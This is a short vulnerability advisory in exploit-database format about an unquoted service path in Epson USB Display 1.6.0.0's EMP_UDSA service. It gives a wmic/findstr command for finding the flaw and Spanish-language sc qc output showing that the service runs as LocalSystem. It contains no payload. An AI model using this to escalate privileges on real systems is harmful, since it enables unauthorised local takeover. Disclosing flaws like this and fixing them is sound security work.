# Exploit Title: Epson USB Display 1.6.0.0 - 'EMP_UDSA' Unquoted Service Path
# Discovery by: Hector Gerbacio
# Discovery Date: 2021-02-05
# Vendor Homepage: https://epson.com.mx/
# Tested Version: 1.6.0.0
# Vulnerability Type: Unquoted Service Path
# Tested on OS: Windows 8.1 con Bing

# Step to discover Unquoted Service Path:

C:\>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\WINDOWS\\" | findstr /i "EMP_UDSA" | findstr /i /v """
EMP_UDSA		EMP_UDSA		C:\Program Files (x86)\EPSON Projector\Epson USB Display V1.6\EMP_UDSA.exe			Auto

# Service info:

C:\>sc qc EMP_UDSA
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: EMP_UDSA
        TIPO               : 110  WIN32_OWN_PROCESS (interactive)
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\EPSON Projector\Epson USB Display V1.6\EMP_UDSA.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : EMP_UDSA
        DEPENDENCIAS       : RPCSS
        NOMBRE_INICIO_SERVICIO: LocalSystem